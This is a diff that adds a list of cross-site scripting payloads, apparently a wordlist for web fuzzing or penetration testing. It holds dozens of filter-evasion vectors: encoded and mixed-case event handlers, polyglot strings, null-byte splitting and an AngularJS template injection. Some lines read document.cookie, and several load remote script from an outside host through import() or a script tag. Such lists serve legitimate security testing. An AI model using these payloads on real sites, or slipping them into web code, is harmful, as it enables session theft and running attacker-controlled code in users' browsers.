@@ -1,0 +1,37 @@
+'"><A HRef=\" AutoFocus OnFocus=top/**/?. >
+%27"><A%20HRef=\"%20AutoFocus%20OnFocus=top/**/?. >
+%27/onerror=alert(1)/%27
+/confirm?.(1)/
+<img+only=1+src=x+onerror=confirm(1)>
+">K=%27><Svg /OnLoad=(confirm)(1)>
+%3Cscript%3Evar%20q=`%22`;alert(document.cookie);%3C/script%3E
+<meter%20value="2"%20min="0"%20max="10"%20onmouseover="alert(%27XSS%27)">2%20out%20of%2010</meter>
+<svg/onload=setInterval(%27al\x65rt(1)%27,5000)>
+<img%20src=x%20onerror=alert%281%29>
+<!-- --!><script>alert(1)</script>
+<script><!--\uFEFF--></script><script>alert(%27BOM%20Injection%27)</script>
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+<img//////src=x oNlY=1 oNerror=alert('xxs')//
+</img+src=x%20oNlY=1%20oNerror=alert(document.cookie)>//
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`//>
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+<img/src=x onError="`${x}`;alert(`Hello`);">
+<img/src/onerror=alert//&NewLine;(2)>
+%27"><Img%0ASrc%0A=OnXSS%0AOnError%0A=alert(1)>
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=18369/.source))}//\76-->
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=18369/.source))//>
+<Script /Src=https://X55.is?1=18369></Script>
+%27)/confirm?.(1);function+myObj(){};function+atob(){confirm?.(1)}//
+--><K:script xmlns:K="http://www.w3.org/1999/xhtml">confirm?.(1)</K:script>
+"'<!--><Img/Src/OnError=(confirm)(1)>"shadowpentesting@gmail.com
+}/confirm?.(1)//%5C
+;1<%252FScript%252F><Img%252FSrc%252FOnError=confirm%253F%252E(1)>
+#Data:,<Img/Src/OnError=(confirm)(1)>
+"' OnError=(confirm)(1) <!--><Img Src='
+'-confirm?.(1);function+myObj(){}'
+confirm?.(1)
+;1%2522--%253E%253CSvg%2520O%256ELoad%253Dconfirm%25281%2529%253E/c
+;1'-confirm`K`-'
+{{$new.constructor('(confirm)(1)')()}}
+%27"><Img%0ASrc%0A=OnXSS%0AOnError%0A=alert(1)>
+'"<%00!--%00><%00Img/Src/On%00Error=(conf%00irm)(1)>
